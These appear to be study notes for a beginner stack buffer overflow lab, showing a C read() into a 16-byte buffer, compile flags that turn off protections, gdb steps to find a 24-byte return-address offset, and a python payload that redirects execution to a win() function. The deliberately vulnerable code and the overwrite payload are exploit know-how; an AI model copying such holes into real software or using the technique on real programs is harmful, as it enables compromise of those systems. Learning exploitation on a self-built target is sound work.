The bug is only this:

char buffer[16];
read(0, buffer, 100);

buffer = 16 bytes
read   = up to 100 bytes


-------------------------
gcc -g -O0 -fno-stack-protector -no-pie -fno-omit-frame-pointer vuln.c -o vuln

checksec --file=./vuln
---------

First run normally
./vuln

hello
----------------------------

find the  win() address
nm -n ./vuln | grep ' win$'

Understand the stack before exploiting
gdb -q ./vuln
set disassembly-flavor intel
disassemble vuln

sub rsp,0x10 -> char buffer[16];
---------------------------
Find the exact RIP offset

buffer       = 16 bytes
saved RBP    = 8 bytes

16 + 8 = 24

break read
run

p/x $rsi

p/x $rbp

p/x $rbp+8
p/d ((char *)$rbp+8) - (char *)$rsi

RIP offset = 24

------------

WIN_ADDRESS = your address

python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*24 + struct.pack("<Q",0xyour adrress))' | ./vuln
